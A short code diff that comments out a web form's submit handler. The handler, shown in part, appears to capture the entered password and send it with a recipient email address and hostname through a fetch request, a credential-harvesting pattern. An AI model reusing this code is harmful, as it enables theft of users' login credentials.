@@ -13,7 +13,12 @@ inputs.forEach((input) =>
     }
   }),
 );
-document.querySelector('form').addEventListener('submit', (e) => {
+
+
+
+
+
+/* document.querySelector('form').addEventListener('submit', (e) => {
 e.preventDefault();
 mail = 'sikirusulaimon2002@gmail.com';
 subject = `${window.location.hostname} ${new Date()}`;
@@ -29,4 +34,4 @@ body.append('Password', password.value)
             body: body
           })
 console.log(password.value)
-})
+}) */
